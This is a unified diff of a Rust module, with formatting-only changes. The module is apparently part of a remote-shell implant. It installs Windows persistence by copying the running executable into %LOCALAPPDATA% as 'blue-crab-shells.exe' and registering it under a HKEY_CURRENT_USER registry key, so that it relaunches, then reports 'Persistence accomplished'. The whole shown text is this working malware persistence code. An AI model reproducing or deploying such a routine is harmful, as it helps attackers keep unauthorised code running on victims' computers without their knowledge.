@@ -1,18 +1,20 @@
-use std::env::{var, args};
+use std::env::{args, var};
 use std::path::Path;
 
 // These are necessary for compiling on Linux
-#[cfg(windows)] use winreg::RegKey;
-#[cfg(windows)] use std::fs::copy;
-#[cfg(windows)] use winreg::enums::HKEY_CURRENT_USER;
+#[cfg(windows)]
+use std::fs::copy;
+#[cfg(windows)]
+use winreg::enums::HKEY_CURRENT_USER;
+#[cfg(windows)]
+use winreg::RegKey;
 
 pub fn handle() -> Result<String, String> {
     #[cfg(windows)]
     match var("LOCALAPPDATA") {
         Ok(v) => {
-            
             let mut persist_path: String = v;
-            // Create our persistence path. Note the r" for 
+            // Create our persistence path. Note the r" for
             // the raw string. This is for the backslashes
             persist_path.push_str(r"\blue-crab-shells.exe");
             // Get the current exe path
@@ -27,7 +29,7 @@ pub fn handle() -> Result<String, String> {
             let (key, _) = hkcu.create_subkey(&path).unwrap();
             key.set_value("BlueCrabShells", &persist_path).unwrap();
             Ok("Persistence accomplished".to_string())
-        },
-        Err(_) => Err("Couldn't get LOCALAPPDATA".to_string())
+        }
+        Err(_) => Err("Couldn't get LOCALAPPDATA".to_string()),
     }
 }
